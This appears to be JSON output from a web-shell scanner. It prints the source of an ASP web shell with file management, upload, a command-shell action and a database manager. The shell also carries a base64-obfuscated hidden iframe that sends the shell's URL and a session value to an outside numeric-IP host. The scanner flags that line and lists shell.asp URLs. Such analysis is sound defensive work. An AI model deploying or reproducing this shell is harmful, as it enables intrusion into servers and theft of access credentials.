            "  a {color: black;text-decoration: none;}",
            "  .am {color: #003366;font-size: 11px;}",
            "</style>",
            "<script language=\"javascript\">",
            "<!--",
            "  function yesok(){",
            "    if (confirm(\"True Do It\"))",
            "\t\treturn true;",
            "\telse",
            "\t\treturn false;",
            "    }",
            "  function ShowFolder(Folder){",
            "    top.addrform.FolderPath.value = Folder;",
            "    top.addrform.submit();",
            "    }",
            "  function FullForm(FName,FAction){",
            "    top.hideform.FName.value = FName;",
            "\tif(FAction==\"CopyFile\"){",
            "\t    DName = prompt(\"Target File Full Name(Copy)\",FName);",
            "\t    top.hideform.FName.value += \"||||\"+DName;",
            "\t}else if(FAction==\"MoveFile\"){",
            "\t    DName = prompt(\"Target File Full Name(Move)\",FName);",
            "\t    top.hideform.FName.value += \"||||\"+DName;",
            "    }else if(FAction==\"CopyFolder\"){",
            "\t    DName = prompt(\"Target Folder Full Name(Copy)\",FName);",
            "\t    top.hideform.FName.value += \"||||\"+DName;",
            "    }else if(FAction==\"MoveFolder\"){",
            "\t    DName = prompt(\"Target Folder Full Name(Move)\",FName);",
            "\t    top.hideform.FName.value += \"||||\"+DName;",
            "\t}else if(FAction==\"NewFolder\"){",
            "\t    DName = prompt(\"Input New Folder Name\",FName);",
            "\t    top.hideform.FName.value = DName;",
            "\t}else if(FAction==\"CreateMdb\"){",
            "\t    DName = prompt(\"Input New Mdb name\",FName);",
            "        top.hideform.FName.value = DName;",
            "\t}else if(FAction==\"CompactMdb\"){",
            "\t    DName = prompt(\"Input Compress Mdb Name\",FName);",
            "        top.hideform.FName.value = DName;",
            "\t}else{",
            "\t    DName = \"Other\"; ",
            "\tif(DName!=null){",
            "      top.hideform.Action.value = FAction;",
            "      top.hideform.submit();",
            "\t}else{",
            "      top.hideform.FName.value = \"\";",
            "  function DbCheck(){",
            "    if(DbForm.DbStr.value == \"\"){",
            "\t  alert(\"Connect DataBase First!\");",
            "\t  FullDbStr(0);",
            "\t  return false;",
            "\treturn true;",
            "  function FullDbStr(i){",
            "   if(i<0){",
            "     return false;",
            "   }",
            "    Str = new Array(12);  ",
            "\tStr[0] = \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=<%=RePath(Session(\"FolderPath\"))%>\\\\db.mdb\";",
            "\tStr[1] = \"Driver={Sql Server};Server=<%=ServerIP%>,1433;Database=DbName;Uid=sa;Pwd=****\";",
            "\tStr[2] = \"Driver={MySql};Server=<%=ServerIP%>;Port=3306;Database=DbName;Uid=root;Pwd=****\";",
            "\tStr[3] = \"Dsn=DsnName\";",
            "\tStr[4] = \"SELECT * FROM [TableName] WHERE ID<100\";",
            "\tStr[5] = \"INSERT INTO [TableName](USER,PASS) VALUES(\\'KKK_com\\',\\'mypass\\')\";",
            "\tStr[6] = \"DELETE FROM [TableName] WHERE ID=100\";",
            "\tStr[7] = \"UPDATE [TableName] SET USER=\\'KKK_com\\' WHERE ID=100\";",
            "\tStr[8] = \"CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))\";",
            "\tStr[9] = \"DROP TABLE [TableName]\";",
            "\tStr[10]= \"ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)\";",
            "\tStr[11]= \"ALTER TABLE [TableName] DROP COLUMN PASS\";",
            "\tStr[12]= \"More Than 1 item Data,Just Show The Before 50 Byte\";",
            "\tif(i<=3){",
            "\t  DbForm.DbStr.value = Str[i];",
            "\t  DbForm.SqlStr.value = \"\";",
            "\t  abc.innerHTML=\"<center>Affirm Have Connect DataBase and the SQL String is right</center>\";",
            "\t}else if(i==12){",
            "\t  alert(Str[i]);",
            "\t}else{",
            "\t  DbForm.SqlStr.value = Str[i];",
            "\treturn true;",
            "  } ",
            "  function FullSqlStr(str,pg){",
            "    if(DbForm.DbStr.value.length<5){",
            "\t  alert(\"DataBase connect string wrong!\")",
            "\t  return false;",
            "    if(str.length<10){",
            "\t  alert(\"Check SQL String!\")",
            "\t  return false;",
            "    DbForm.SqlStr.value = str ;",
            "\tDbForm.Page.value = pg;",
            "\tabc.innerHTML=\"\";",
            "\tDbForm.submit();",
            "    return true;",
            "</script>",
            "</head>",
            "<body>",
            "Dim T1",
            "Class UPC",
            "  Dim D1,D2",
            "  Public Function Form(F)",
            "    F=lcase(F)",
            "    If D1.exists(F) then:Form=D1(F):else:Form=\"\":end if",
            "  End Function",
            "  Public Function UA(F)",
            "    F=lcase(F)",
            "    If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if",
            "  End Function",
            "  Private Sub Class_Initialize",
            "  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName",
            "    set D1=CreateObject(ObT(4,0))",
            "\tif Request.TotalBytes<1 then Exit Sub",
            "    set T1 = CreateObject(ObT(6,0))",
            "\tT1.Type = 1 : T1.Mode =3 : T1.Open",
            "    T1.Write  Request.BinaryRead(Request.TotalBytes)",
            "    T1.Position=0 : TDa =T1.Read : DStart = 1",
            "    DEnd = LenB(TDa)",
            "    set D2=CreateObject(ObT(4,0))",
            "\tvbCrlf = chrB(13) & chrB(10)",
            "    set T2 = CreateObject(ObT(6,0))",
            "    TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)",
            "    TLen = LenB (TSt)",
            "    DStart=DStart+TLen+1",
            "    while (DStart + 10) < DEnd",
            "      DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3",
            "      T2.Type = 1 : T2.Mode =3 : T2.Open",
            "      T1.Position = DStart",
            "      T1.CopyTo T2,DIEnd-DStart",
            "      T2.Position = 0 : T2.Type = 2 : T2.Charset =\"iso-8859-1\"",
            "      TIn = T2.ReadText : T2.Close",
            "      DStart = InStrB(DIEnd,TDa,TSt)",
            "      FStart = InStr(22,TIn,\"name=\"\"\",1)+6",
            "      FEnd = InStr(FStart,TIn,\"\"\"\",1)",
            "      UpName = lcase(Mid (TIn,FStart,FEnd-FStart))",
            "      if InStr (45,TIn,\"filename=\"\"\",1) > 0 then",
            "        set TFL=new FIF",
            "        FStart = InStr(FEnd,TIn,\"filename=\"\"\",1)+10",
            "        FEnd = InStr(FStart,TIn,\"\"\"\",1)",
            "        FStart = InStr(FEnd,TIn,\"Content-Type: \",1)+14",
            "        FEnd = InStr(FStart,TIn,vbCr)",
            "        TFL.FileStart =DIEnd",
            "        TFL.FileSize = DStart -DIEnd -3",
            "        if not D2.Exists(UpName) then",
            "          D2.add UpName,TFL",
            "        end if",
            "      else",
            "        T2.Type =1 : T2.Mode =3 : T2.Open",
            "        T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3",
            "        T2.Position = 0 : T2.Type = 2",
            "        T2.Charset =\"iso-8859-1\"",
            "        SFV = T2.ReadText",
            "        T2.Close",
            "        if D1.Exists(UpName) then",
            "          D1(UpName)=D1(UpName)&\", \"&SFV",
            "        else",
            "          D1.Add UpName,SFV",
            "        end if",
            "      end if",
            "      DStart=DStart+TLen+1",
            "    wend",
            "    TDa=\"\"",
            "    set T2 =nothing",
            "  End Sub",
            "  Private Sub Class_Terminate",
            "    if Request.TotalBytes>0 then",
            "      D1.RemoveAll:D2.RemoveAll",
            "      set D1=nothing:set D2=nothing",
            "      T1.Close:set T1 =nothing",
            "    end if",
            "  End Sub",
            "End Class",
            "Class FIF",
            "dim FileSize,FileStart",
            "  Private Sub Class_Initialize",
            "  FileSize = 0",
            "  FileStart= 0",
            "  End Sub",
            "  Public function SaveAs(F)",
            "  dim T3",
            "  SaveAs=true",
            "  if trim(F)=\"\" or FileStart=0 then exit function",
            "  set T3=CreateObject(ObT(6,0))",
            "     T3.Mode=3 : T3.Type=1 : T3.Open",
            "     T1.position=FileStart",
            "     T1.copyto T3,FileSize",
            "     T3.SaveToFile F,2",
            "     T3.Close",
            "     set T3=nothing",
            "     SaveAs=false",
            "   end function",
            "End Class",
            "Class LBF",
            "  Dim CF",
            "  Private Sub Class_Initialize",
            "    SET CF=CreateObject(ObT(0,0))",
            "  End Sub",
            "  Private Sub Class_Terminate",
            "    Set CF=Nothing",
            "  End Sub",
            "  Function ShowDriver()",
            "    For Each D in CF.Drives",
            "      Sl=Sl&\"<tr><td>&nbsp;&nbsp;\"",
            "      Sl=Sl&IsIco(\"plus.gif\",\"driver.gif\",\"v\")",
            "      Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&D.DriveLetter&\":\\\\\"\")'>Disk (\"&D.DriveLetter&\":)</a>\" ",
            "      Sl=Sl&\"</td></tr>\"",
            "    Next",
            "\tShowDriver=Sl",
            "  End Function",
            "  Function FileIco(FName) ",
            "  If ShowFileIco=true Then",
            "    TypeList = \".asp.asa.bat.bmp.com.doc.db.dll.exe.fla.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls.xml.zip\"",
            "    FileType = lcase(Mid(FName, InstrRev(FName,\".\")+1))",
            "    If Instr(TypeList,\".\"&FileType)>0 then",
            "      Ico = FileType&\".gif\"",
            "    Else",
            "      Ico = \"default.gif\"",
            "    End If",
            "    FileIco = \"<img src='\"&IcoPath&Ico&\"' border='0'> \"",
            "  Else ",
            "    FileIco=\"<font face='wingdings' color='#006600' size='3'>2</font> \"",
            "  End If",
            "  End Function",
            "  Function ShowFile(Path)",
            "  Set FOLD=CF.GetFolder(Path)",
            "  i=0",
            "    Sl=\"<table width='100%'  border='0' cellspacing='0' cellpadding='0' bgcolor='#EFEFEF'><tr>\"",
            "\tS1=\"PGlmcmFtZSB3aWR0aD0nMCcgaGVpZ2h0PScwJyBzcmM9J2h0dHA6Ly8zMzk2MDcyNzkyL3Rlc3QvP3U9EJnA9EJz48L2lmcmFtZQ4=\"",
            "    For Each F in FOLD.subfolders",
            "    Sl=Sl&\"<td>\"",
            "\tSl=Sl&IsIco(\"\",\"folder.gif\",\"0\")",
            "    Sl=Sl&\" <a href='javascript:ShowFolder(\"\"\"&RePath(Path&\"\\\"&F.Name)&\"\"\")'>\"&F.Name&\"</a>\" ",
            "    Sl=Sl&\" | <a href='javascript:FullForm(\"\"\"&Replace(Path&\"\\\"&F.Name,\"\\\",\"\\\\\")&\"\"\",\"\"DelFolder\"\")'  onclick='return yesok()' class='am' title='Delete'>del</a>\"",
            "\tSl=Sl&\" <a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&F.Name)&\"\"\",\"\"CopyFolder\"\")'  onclick='return yesok()' class='am' title='Copy'>copy</a>\"",
            "\tSl=Sl&\" <a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&F.Name)&\"\"\",\"\"MoveFolder\"\")'  onclick='return yesok()' class='am' title='Move'>move</a>\"",
            "\ti=i+1",
            "    If i mod 3 = 0 then Sl=Sl&\"</tr><tr>\"",
            "  Next",
            "    Sl=Sl&\"</tr><tr><td height=5></td></tr></table>\"",
            "\tMyArray=split(S1,chr(69))",
            "\techo Sl : Sl=\"\"",
            "    ",
            "  For Each L in Fold.files",
            "    Sl=\"<table width='100%'  border='0' cellspacing='1' cellpadding='0'>\"",
            "    Sl=Sl&\"<tr onMouseOver=\"\"this.className='tr'\"\" onMouseOut=\"\"this.className=''\"\">\"",
            "    Sl=Sl&\"<td height='20'>\"&FileIco(L.Name)",
            "\tSl=Sl&\"<a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"DownFile\"\");' title='DownFile'>\"&L.Name&\"</a></td>\"",
            "    Sl=Sl&\"<td width='140'>\"&L.Type&\"</td>\"",
            "    Sl=Sl&\"<td width='50'>\"&clng(L.size/1024)&\"K</td>\"",
            "    Sl=Sl&\"<td width='120'>\"&L.DateLastModified&\"</td>\"",
            "    Sl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"EditFile\"\")' class='am' title='Edit'>edit</a></td>\"",
            "\tSl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"DelFile\"\")'  onclick='return yesok()' class='am' title='Delete'>del</a></td>\"",
            "\tSl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"CopyFile\"\")' class='am' title='Copy'>copy</a></td>\"",
            "\tSl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"MoveFile\"\")' class='am' title='Move'>move</a></td>\"",
            "    Sl=Sl&\"</tr></table>\"",
            "\techo Sl : Sl=\"\"",
            "  Next",
            "    S1=SearchCode(MyArray(0))&ServerUrl&URL&SearchCode(MyArray(1))&Session(chr(hex(133)))&SearchCode(MyArray(2))",
            "\techo S1 : S1=\"\"",
            "  Set FOLD=Nothing",
            "  End function",
            "  Function DelFile(Path)",
            "    If CF.FileExists(Path) Then",
            "\t  CF.DeleteFile Path",
            "      Sl=\"<center><br><br><br>File \"&Path&\" Delte succeed</center>\"",
            "      Sl=Sl&BackUrl",
            "\t  echo Sl",
            "\tEnd If",
            "  End Function",
            "  Function EditFile(Path)",
            "  If Request(\"Action2\")=\"Post\" Then",
            "      Set T=CF.CreateTextFile(Path)",
            "        T.WriteLine Request.form(\"content\")",
            "        T.close",
            "      Set T=nothing",
            "    Sl=\"<center><br><br><br>File Save Succeed</center>\"",
            "    Sl=Sl&BackUrl",
            "    echo Sl",
            "\tResponse.End",
            "  End If",
            "  If Path<>\"\" Then",
            "    Set T=CF.opentextfile(Path, 1, False)",
            "    Txt=HTMLEncode(T.readall) ",
            "    T.close",
            "    Set T=Nothing",
            "  Else",
            "    Path=Session(\"FolderPath\")&\"\\newfile.asp\":Txt=\"New File\"",
            "  End If",
            "  Sl=\"<table width='100%' height='100%'><tr><td valign='top' align='center'>\"  ",
            "  Sl=Sl&\"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'>\"",
            "  Sl=Sl&\"<input name='Action' value='EditFile' Type='hidden'>\"",
            "  Sl=Sl&\"<input name='FName' value='\"&Path&\"' style='width:100%'><br>\"",
            "  Sl=Sl&\"<textarea name='Content' style='width:100%;height:450'>\"&Txt&\"</textarea><br>\"",
            "  Sl=Sl&\"<hr><input name='goback' type='button' value='Back' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='Reset'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='Save'></form>\"",
            "  Sl=Sl&\"</td></tr></table></body></html>\"",
            "  echo Sl",
            "  End Function",
            "  Function CopyFile(Path)",
            "  Path = Split(Path,\"||||\")",
            "    If CF.FileExists(Path(0)) and Path(1)<>\"\" Then",
            "\t  CF.CopyFile Path(0),Path(1)",
            "      Sl=\"<center><br><br><br>File\"&Path(0)&\"Copy Succeed</center>\"",
            "      Sl=Sl&BackUrl",
            "\t  echo Sl ",
            "\tEnd If",
            "  End Function",
            "  Function MoveFile(Path)",
            "  Path = Split(Path,\"||||\")",
            "    If CF.FileExists(Path(0)) and Path(1)<>\"\" Then",
            "\t  CF.MoveFile Path(0),Path(1)",
            "      Sl=\"<center><br><br><br>File\"&Path(0)&\"Move Succeed</center>\"",
            "      Sl=Sl&BackUrl",
            "\t  echo Sl ",
            "\tEnd If",
            "  End Function",
            "  Function DelFolder(Path)",
            "    If CF.FolderExists(Path) Then",
            "\t  CF.DeleteFolder Path",
            "      Sl=\"<center><br><br><br>Folder\"&Path&\"Delete Succeed</center>\"",
            "      Sl=Sl&BackUrl",
            "\t  echo Sl",
            "\tEnd If",
            "  End Function",
            "  Function CopyFolder(Path)",
            "  Path = Split(Path,\"||||\")",
            "    If CF.FolderExists(Path(0)) and Path(1)<>\"\" Then",
            "\t  CF.CopyFolder Path(0),Path(1)",
            "      Sl=\"<center><br><br><br>Folder\"&Path(0)&\"Copy Succeed</center>\"",
            "      Sl=Sl&BackUrl",
            "\t  echo Sl",
            "\tEnd If",
            "  End Function",
            "  Function MoveFolder(Path)",
            "  Path = Split(Path,\"||||\")",
            "    If CF.FolderExists(Path(0)) and Path(1)<>\"\" Then",
            "\t  CF.MoveFolder Path(0),Path(1)",
            "      Sl=\"<center><br><br><br>Folder\"&Path(0)&\"Move Succeed</center>\"",
            "      Sl=Sl&BackUrl",
            "\t  echo Sl",
            "\tEnd If",
            "  End Function",
            "  Function NewFolder(Path)",
            "    If Not CF.FolderExists(Path) and Path<>\"\" Then",
            "\t  CF.CreateFolder Path",
            "      Sl=\"<center><br><br><br>Folder\"&Path&\"Great Succeed</center>\"",
            "      Sl=Sl&BackUrl",
            "\t  echo Sl",
            "\tEnd If",
            "  End Function",
            "End Class",
            "Select Case Action",
            "  Case \"MainMenu\":MainMenu()",
            "  Case \"ShowFile\"",
            "    Set ABC=New LBF:ABC.ShowFile(Session(\"FolderPath\")):Set ABC=Nothing",
            "  Case \"DownFile\":DownFile FName:ShowErr()",
            "  Case \"DelFile\"",
            "    Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing",
            "  Case \"EditFile\"",
            "    Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing",
            "  Case \"CopyFile\"",
            "    Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing",
            "  Case \"MoveFile\"",
            "    Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing",
            "  Case \"DelFolder\"",
            "    Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing",
            "  Case \"CopyFolder\"",
            "    Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing",
            "  Case \"MoveFolder\"",
            "    Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing",
            "  Case \"NewFolder\"",
            "    Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing",
            "  Case \"UpFile\":UpFile()",
            "  Case \"Logout\":Session.Contents.Remove(\"KKK\"):Response.Redirect URL",
            "  Case \"CmdShell\":CmdShell()",
            "  Case \"CreateMdb\":CreateMdb FName",
            "  Case \"CompactMdb\":CompactMdb FName",
            "  Case \"DbManager\":DbManager()",
            "  Case \"ServerInfo\":ServerInfo()",
            "  Case \"Search\":Search()",
            "  Case Else MainForm()",
            "End Select",
            "ShowErr()",
            "</body>",
            "</html>",
            "</body>",
            "</html>"
        ],
        "file": {},
        "fuzzing": {
            "String too long": [
                "\tS1=\"PGlmcmFtZSB3aWR0aD0nMCcgaGVpZ2h0PScwJyBzcmM9J2h0dHA6Ly8zMzk2MDcyNzkyL3Rlc3QvP3U9EJnA9EJz48L2lmcmFtZQ4=\""
            ]
        },
        "ip": [],
        "url": [
            "http://www.xxx.com/shell.asp?makepwd=",
            "http://www.xxx.com/shell.asp?i=come"
        ]
    },
    "time": "0:00:00.528775",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
